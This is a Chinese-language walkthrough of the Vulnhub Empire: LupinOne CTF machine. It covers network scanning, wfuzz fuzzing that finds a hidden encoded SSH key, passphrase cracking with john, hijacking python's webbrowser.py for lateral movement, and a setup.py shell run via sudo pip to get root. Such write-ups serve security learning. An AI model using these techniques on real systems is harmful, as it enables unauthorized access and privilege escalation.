绝了。

what can i say？

嘛，就当学习了**wfuzz**）

---

## Vulnhub-Empire: LupinOne题解

本靶机为Vulnhub上Empire系列之LupinOne，地址：[EMPIRE: LUPINONE](https://www.vulnhub.com/entry/empire-lupinone,750/)

### 扫描与发现

利用`arp-scan`命令扫描靶机IP

```mipsasm
arp-scan -l
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126114931272-1489557369.png)

利用`nmap`扫描开放端口

```css
nmap -sV -p- 192.168.164.190
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126114948696-1540008816.png)

### 目标探索

浏览器打开80端口，发现是一张图片，没有其他内容，检测源代码也没有发现有用信息

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115005497-438124078.png)

检查`robots.txt`文件发现`/~myfiles`目录，打开却发现Error 404

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115020078-347234152.png)

在旧版本的Apache服务器中，~ 指代用户主目录，我们可以尝试找到与此相似的路径，使用`wfuzz`工具对其路径进行测试，发现`~secret`目录

```ruby
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 403,404 http://192.168.164.190/~FUZZ
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115034425-1946527080.png)

在浏览器中打开该路径`~secret/`发现一段文字

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115046427-1537791620.png)

上面称这是一个秘密目录，这里隐藏了他创建的ssh 私钥文件，并且得知用户名为`icex64`。接下来继续在该路径下搜索文件，得到`.mysecret.txt`文件

```bash
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hc 404,403 -u http://192.168.164.190/~secret/.FUZZ.txt
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115101762-1917292882.png)

浏览器打开发现是一串编码后的字符串

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115123364-1549518720.png)

可以使用编码识别工具进行识别，发现其为Base58，使用在线工具进行解码得到私钥文件内容

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115142141-1681107022.png)

### 拿到shell

在本地创建文件key，将私钥保存到其中，然后使用`john`工具破解密码

```bash
python2 /usr/share/john/ssh2john.py key > keyhash
john keyhash --wordlist=/usr/share/wordlists/fasttrack.txt
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115233444-2009431106.png)

得到密码为`P@55w0rd!`。将key 文件权限设为600（否则无法连接），然后利用ssh连接`icex64`用户

```perl
chmod 600 key
ssh icex64@192.168.164.190 -i key
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115244925-2141247299.png)

### 水平越权

拿到shell后搜索`suid`文件，`Capability`文件，`sudo -l`发现可以执行一条命令

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115256301-970320644.png)

来到/home/arsene目录下，查看heist.py文件权限，没有修改权限，查看内容，发现其调用了`webbrower.open()`

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115307529-1606611762.png)

我们通过`find`找到该文件的位置，查看其权限，发现可以写入内容

```bash
find /usr/ -name '*webbrowser*'
ls -l /usr/lib/python3.9/webbrowser.py
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115319963-1343891168.png)

我们可以直接编辑该文件，写入调用shell脚本（或者反弹shell脚本）

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115332875-1300040059.png)

保存退出，执行，获得arsene用户shell

```bash
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115346038-749179116.png)

### 权限提升

拿到arsene用户权限后，查看`sudo -l`，发现可以免密执行`/usr/bin/pip`

```undefined
sudo -l
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115358617-1023185760.png)

我们可以在当前路径下新创建一个目录并打开在里面创建`setup.py`文件，里面写入我们想运行的python脚本，如反弹shell，然后利用`pip install`以root权限执行。

```bash
mkdir tmp
cd tmp
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > setup.py
sudo pip install .
```

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115409549-1246071179.png)

来到root目录下，打开root.txt拿到flag

![img](https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115419899-1799323647.png)